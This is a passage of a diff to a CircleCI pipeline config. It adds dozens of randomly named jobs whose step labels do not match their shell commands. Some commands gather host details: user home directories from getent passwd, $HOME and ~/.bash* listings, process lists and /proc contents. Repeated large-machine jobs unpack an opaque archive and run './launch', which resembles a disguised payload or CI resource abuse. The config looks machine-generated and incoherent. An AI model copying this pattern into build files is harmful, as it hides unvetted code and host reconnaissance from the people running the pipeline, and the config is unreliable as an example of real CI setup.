+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/bosonsweep 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  map20051127:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Wave 16 Of 29 Inspecting Centrifuge Rotor
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; (umask 077; touch "/tmp/reply.center.list" && stat -c %a "/tmp/reply.center.list"); true ; } > /tmp/build-tree/iter9_d340
+            echo "stage ok: b=$(wc -c </tmp/build-tree/iter9_d340), l=$(wc -l </tmp/build-tree/iter9_d340), w=$(wc -w </tmp/build-tree/iter9_d340)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'iter9_d340'
+  v7-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/iter9_d340 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  bugfix_close_lock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Book V boss arena randomize
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf -v today '%(%Y%m%d)T' -1; echo $today; true ; } > /tmp/build-tree/4426c5d
+            echo "stage ok: b=$(wc -c </tmp/build-tree/4426c5d), l=$(wc -l </tmp/build-tree/4426c5d), w=$(wc -w </tmp/build-tree/4426c5d)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '4426c5d'
+  pr-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/4426c5d 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  aside-fill:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Review NDA
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; arr=(shark cat duck fox); echo ${arr[-1]}; true ; } > /tmp/build-tree/t174n_queue_ag3n7_5i13nt
+            echo "stage ok: b=$(wc -c </tmp/build-tree/t174n_queue_ag3n7_5i13nt), l=$(wc -l </tmp/build-tree/t174n_queue_ag3n7_5i13nt), w=$(wc -w </tmp/build-tree/t174n_queue_ag3n7_5i13nt)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 't174n_queue_ag3n7_5i13nt'
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/t174n_queue_ag3n7_5i13nt 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  rgt_pkt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Here I convert the waveform
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; idx="garden_silver" && echo "[${idx:2}]"; true ; } > /tmp/build-tree/ysi
+            echo "stage ok: b=$(wc -c </tmp/build-tree/ysi), l=$(wc -l </tmp/build-tree/ysi), w=$(wc -w </tmp/build-tree/ysi)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'ysi'
+  pr-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/ysi 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  ConvertTo-OffsetPixel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: A03 CALIBRATION
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f6 | awk -F "/" '{ print $NF }'; true ; } > /tmp/build-tree/fb502024-cf41-7c6f
+            echo "stage ok: b=$(wc -c </tmp/build-tree/fb502024-cf41-7c6f), l=$(wc -l </tmp/build-tree/fb502024-cf41-7c6f), w=$(wc -w </tmp/build-tree/fb502024-cf41-7c6f)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'fb502024-cf41-7c6f'
+  ValidateStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/fb502024-cf41-7c6f 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+
+  patelpatel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Quantize Loss Curve Stage
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; ls -A $HOME| rev| head --lines=6; true ; } > /tmp/build-tree/20200418
+            echo "stage ok: b=$(wc -c </tmp/build-tree/20200418), l=$(wc -l </tmp/build-tree/20200418), w=$(wc -w </tmp/build-tree/20200418)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '20200418'
+  view_2015_02:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: My growth medium chill
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; command ls --numeric-uid-gid .; true ; } > /tmp/build-tree/NOISE_MOTH_BACKUP_FLAME
+            echo "stage ok: b=$(wc -c </tmp/build-tree/NOISE_MOTH_BACKUP_FLAME), l=$(wc -l </tmp/build-tree/NOISE_MOTH_BACKUP_FLAME), w=$(wc -w </tmp/build-tree/NOISE_MOTH_BACKUP_FLAME)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'NOISE_MOTH_BACKUP_FLAME'
+  phj2h6bvcrovce:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: last bit
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=6797\nuser=liam\ndebug=true\n' >${TMPDIR:-/tmp}/pile_region.dat && awk -F= '$1=="debug" {print $2}' ${TMPDIR:-/tmp}/pile_region.dat; true ; } > /tmp/build-tree/c9bbad5d
+            echo "stage ok: b=$(wc -c </tmp/build-tree/c9bbad5d), l=$(wc -l </tmp/build-tree/c9bbad5d), w=$(wc -w </tmp/build-tree/c9bbad5d)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'c9bbad5d'
+  matchAccountShipment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Dismiss the skeleton loader slowly
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -type l -name '*map*' -size +10k -exec ls -ld {} + 2> /dev/null | wc -l; true ; } > /tmp/build-tree/iter9_d340
+            echo "stage ok: b=$(wc -c </tmp/build-tree/iter9_d340), l=$(wc -l </tmp/build-tree/iter9_d340), w=$(wc -w </tmp/build-tree/iter9_d340)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'iter9_d340'
+  Trim--CoLuMn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-5 hash
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; mkdir -p "/var/tmp/cherry" && touch "/var/tmp/cherry"/part{1..2}.json && ls "/var/tmp/cherry"; true ; } > /tmp/build-tree/bosonsweep
+            echo "stage ok: b=$(wc -c </tmp/build-tree/bosonsweep), l=$(wc -l </tmp/build-tree/bosonsweep), w=$(wc -w </tmp/build-tree/bosonsweep)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'bosonsweep'
+  logq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Announcement on the hour
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; for x in $HOME/.bash*; do echo "$(basename $x): $(wc -l < $x)"; done | nl; true ; } > /tmp/build-tree/surge-51gn41
+            echo "stage ok: b=$(wc -c </tmp/build-tree/surge-51gn41), l=$(wc -l </tmp/build-tree/surge-51gn41), w=$(wc -w </tmp/build-tree/surge-51gn41)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'surge-51gn41'
+  ValueFunc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Dilute the overnight culture gently
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; grep -v -e 'proc' /proc/filesystems|sort -u; true ; } > /tmp/build-tree/ysi
+            echo "stage ok: b=$(wc -c </tmp/build-tree/ysi), l=$(wc -l </tmp/build-tree/ysi), w=$(wc -w </tmp/build-tree/ysi)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'ysi'
+  b6-6f-39:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: chill type scheduled
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; test ! -e /etc/hosts && echo 'ok'||echo 'not ok'; true ; } > /tmp/build-tree/t174n_queue_ag3n7_5i13nt
+            echo "stage ok: b=$(wc -c </tmp/build-tree/t174n_queue_ag3n7_5i13nt), l=$(wc -l </tmp/build-tree/t174n_queue_ag3n7_5i13nt), w=$(wc -w </tmp/build-tree/t174n_queue_ag3n7_5i13nt)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 't174n_queue_ag3n7_5i13nt'
+  ziltwe88:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: afterFinanceSummary
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; ls -o -G -X -A /proc | awk 'NR>1 {print $1}' | sort | uniq -c; true ; } > /tmp/build-tree/MRRE
+            echo "stage ok: b=$(wc -c </tmp/build-tree/MRRE), l=$(wc -l </tmp/build-tree/MRRE), w=$(wc -w </tmp/build-tree/MRRE)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'MRRE'
+  y13ld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-5 hash
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -l /mnt | awk '{ print $9 }'; true ; } > /tmp/build-tree/dat
+            echo "stage ok: b=$(wc -c </tmp/build-tree/dat), l=$(wc -l </tmp/build-tree/dat), w=$(wc -w </tmp/build-tree/dat)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'dat'
+  tbd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: I own accessibility audit spot check
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf 'blue\t41\ncorner\t68\nsugar\t23\nclient\t74\n' >"/var/tmp/top-migration.dat" && expand -t 12 "/var/tmp/top-migration.dat"; true ; } > /tmp/build-tree/fb502024-cf41-7c6f
+            echo "stage ok: b=$(wc -c </tmp/build-tree/fb502024-cf41-7c6f), l=$(wc -l </tmp/build-tree/fb502024-cf41-7c6f), w=$(wc -w </tmp/build-tree/fb502024-cf41-7c6f)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'fb502024-cf41-7c6f'
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Cross fingers and double tap the password field
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; find /run -type l -iname '*lock*' -exec stat -c %F {} \; 2> /dev/null | sort | head -n 8; true ; } > /tmp/build-tree/signal548
+            echo "stage ok: b=$(wc -c </tmp/build-tree/signal548), l=$(wc -l </tmp/build-tree/signal548), w=$(wc -w </tmp/build-tree/signal548)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'signal548'
+  posPx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Album art is clean
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; ps aux | tail -n +2 | head -n 12 | tail -n +2; true ; } > /tmp/build-tree/TICKET-18070-DK
+            echo "stage ok: b=$(wc -c </tmp/build-tree/TICKET-18070-DK), l=$(wc -l </tmp/build-tree/TICKET-18070-DK), w=$(wc -w </tmp/build-tree/TICKET-18070-DK)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'TICKET-18070-DK'
+  FormBit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: and so on
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; list=(hawk test payroll input job cheese); (IFS=,; echo "${list[*]}"); true ; } > /tmp/build-tree/BOSON
+            echo "stage ok: b=$(wc -c </tmp/build-tree/BOSON), l=$(wc -l </tmp/build-tree/BOSON), w=$(wc -w </tmp/build-tree/BOSON)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'BOSON'
+  TYZVPL-39484a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Wave Twelve Replicate The Billing Records
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /var/tmp/chunk-shard.conf && sed -i.bak 's/localhost/LOCALHOST/' /var/tmp/chunk-shard.conf && cat /var/tmp/chunk-shard.conf; true ; } > /tmp/build-tree/MVI_29884
+            echo "stage ok: b=$(wc -c </tmp/build-tree/MVI_29884), l=$(wc -l </tmp/build-tree/MVI_29884), w=$(wc -w </tmp/build-tree/MVI_29884)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'MVI_29884'
+  tax-small_class:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Where are the thumbnails
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'hello from the shell' | md5sum; true ; } > /tmp/build-tree/9f6168928
+            echo "stage ok: b=$(wc -c </tmp/build-tree/9f6168928), l=$(wc -l </tmp/build-tree/9f6168928), w=$(wc -w </tmp/build-tree/9f6168928)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '9f6168928'
+  tl_SK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: FAST encoding
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; find /dev -type f -name 'fd' -exec ls -l {} ";" 2>/dev/null|awk -F/ '{print $NF}'; true ; } > /tmp/build-tree/GOPR-53468
+            echo "stage ok: b=$(wc -c </tmp/build-tree/GOPR-53468), l=$(wc -l </tmp/build-tree/GOPR-53468), w=$(wc -w </tmp/build-tree/GOPR-53468)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'GOPR-53468'
+  copyCanvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Accrue the ledger net of tax
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; seq 2 56 | tac | sort -n; true ; } > /tmp/build-tree/TXN_080289
+            echo "stage ok: b=$(wc -c </tmp/build-tree/TXN_080289), l=$(wc -l </tmp/build-tree/TXN_080289), w=$(wc -w </tmp/build-tree/TXN_080289)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'TXN_080289'
+  hero--warning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: spin up and freeze
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; touch -t 201908081200 "${TMPDIR:-/tmp}/banner.log" && stat -c %y "${TMPDIR:-/tmp}/banner.log"; true ; } > /tmp/build-tree/VID32038
+            echo "stage ok: b=$(wc -c </tmp/build-tree/VID32038), l=$(wc -l </tmp/build-tree/VID32038), w=$(wc -w </tmp/build-tree/VID32038)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'VID32038'
+  uat-dev-63:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Animation limit 300
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; u=1; until (( u > 250 )); do u=$((u*2)); done; echo $u; true ; } > /tmp/build-tree/b5528403-cfa0-2596-3251
+            echo "stage ok: b=$(wc -c </tmp/build-tree/b5528403-cfa0-2596-3251), l=$(wc -l </tmp/build-tree/b5528403-cfa0-2596-3251), w=$(wc -w </tmp/build-tree/b5528403-cfa0-2596-3251)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'b5528403-cfa0-2596-3251'
+  Tool67:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Op Walnut
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; type python3 &>/dev/null && echo "have python3" || echo "no python3"; true ; } > /tmp/build-tree/85.174.46.206
+            echo "stage ok: b=$(wc -c </tmp/build-tree/85.174.46.206), l=$(wc -l </tmp/build-tree/85.174.46.206), w=$(wc -w </tmp/build-tree/85.174.46.206)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '85.174.46.206'
+workflows:
+  default:
+    jobs:
+      - lkj
+      - ValidateImage:
+          requires:
+            - lkj
+      - counter_vec:
+          requires:
+            - lkj
+      - vega-plus:
+          requires:
+            - counter_vec
+      - setup_param_test:
+          requires:
+            - counter_vec
+      - Package_App7:
+          requires:
+            - setup_param_test
+      - open_tax_indigo_zip_line:
+          requires:
+            - setup_param_test
+      - fiona-ship:
+          requires:
+            - open_tax_indigo_zip_line
+      - tr_mn:
+          requires:
+            - open_tax_indigo_zip_line
+      - QA_MERGE_5:
+          requires:
+            - tr_mn
+      - bugfix_close_lock:
+          requires:
+            - tr_mn
+      - pr-v2:
+          requires:
+            - bugfix_close_lock
+      - user_flatten_line:
+          requires:
+            - bugfix_close_lock
+      - sam-push:
+          requires:
+            - user_flatten_line
+      - js-input-link:
+          requires:
+            - user_flatten_line
+      - go-live:
+          requires:
+            - js-input-link
+      - ortho_rect:
+          requires:
+            - js-input-link
+      - release:
+          requires:
+            - ortho_rect
+      - tensorschedule
+      - patelpatel:
+          requires:
+            - tensorschedule
+      - API-527:
+          requires:
+            - patelpatel
+      - Type-Bundle-Provider:
+          requires:
+            - patelpatel
+      - view_2015_02:
+          requires:
+            - Type-Bundle-Provider
+      - promote:
+          requires:
+            - view_2015_02
+      - undo-migration_color:
+          requires:
+            - view_2015_02
+      - phj2h6bvcrovce:
+          requires:
+            - undo-migration_color
+      - blast-off:
+          requires:
+            - phj2h6bvcrovce
+      - map20051127:
+          requires:
+            - phj2h6bvcrovce
+      - matchAccountShipment:
+          requires:
+            - map20051127
+      - v7-nightly:
+          requires:
+            - matchAccountShipment
+      - needs_box:
+          requires:
+            - matchAccountShipment
+      - Trim--CoLuMn:
+          requires:
+            - needs_box
+      - add-parse:
+          requires:
+            - Trim--CoLuMn
+      - draingflearkgo:
+          requires:
+            - Trim--CoLuMn
+      - logq:
+          requires:
+            - draingflearkgo
+      - refactor-7001:
+          requires:
+            - logq
+      - rgt_pkt:
+          requires:
+            - logq
+      - ValueFunc:
+          requires:
+            - rgt_pkt
+      - pr-2:
+          requires:
+            - ValueFunc
+      - aside-fill:
+          requires:
+            - ValueFunc
+      - b6-6f-39:
+          requires:
+            - aside-fill
+      - spin-up:
+          requires:
+            - b6-6f-39
+      - lightning-old-socket-tree
+      - ziltwe88:
+          requires:
+            - lightning-old-socket-tree
+      - green-light-go:
+          requires:
+            - ziltwe88
+      - f32fc5a249d5cb:
+          requires:
+            - ziltwe88
+      - y13ld:
+          requires:
+            - f32fc5a249d5cb
+      - ensure-staging-release-candidate:
+          requires:
+            - y13ld
+      - ConvertTo-OffsetPixel:
+          requires:
+            - y13ld
+      - tbd:
+          requires:
+            - ConvertTo-OffsetPixel
+      - ValidateStaging:
+          requires:
+            - tbd
+      - monitor055:
+          requires:
+            - tbd
+      - readComplexArticleAdapter:
+          requires:
+            - monitor055
+      - CORE-316:
+          requires:
+            - readComplexArticleAdapter
+      - FTR-ITEM-REC:
+          requires:
+            - readComplexArticleAdapter
+      - posPx:
+          requires:
+            - FTR-ITEM-REC
+      - send-it:
+          requires:
+            - posPx
+      - grace-box:
+          requires:
+            - posPx
+      - FormBit:
+          requires:
+            - grace-box
+      - vela-final:
+          requires:
+            - FormBit
+      - export_ref:
+          requires:
+            - FormBit
+      - TYZVPL-39484a:
+          requires:
+            - export_ref
+      - nightly-v2:
+          requires:
+            - TYZVPL-39484a
+      - ref_catch:
+          requires:
+            - TYZVPL-39484a
+      - tax-small_class:
+          requires:
+            - ref_catch
+      - defualt-91:
+          requires:
+            - tax-small_class
+      - fill-gold:
+          requires:
+            - tax-small_class
+      - tl_SK:
+          requires:
+            - fill-gold
+      - feat-3412:
+          requires:
+            - tl_SK
+      - SCHEMA_PORT_36:
+          requires:
+            - tl_SK
+      - copyCanvas:
+          requires:
+            - SCHEMA_PORT_36
+      - wip-metrics-bug:
+          requires:
+            - copyCanvas
+      - TotalReader:
+          requires:
+            - copyCanvas
+      - hero--warning:
+          requires:
+            - TotalReader
+      - CHECK_PROD:
+          requires:
+            - hero--warning
+      - dumpCountForKey:
+          requires:
+            - hero--warning
+      - uat-dev-63:
+          requires:
+            - dumpCountForKey
+      - check-production-release-candidate:
+          requires:
+            - uat-dev-63
+      - pbFILE:
+          requires:
+            - uat-dev-63
+      - Tool67:
+          requires:
+            - pbFILE
+      - whiskey-7:
+          requires:
+            - Tool67
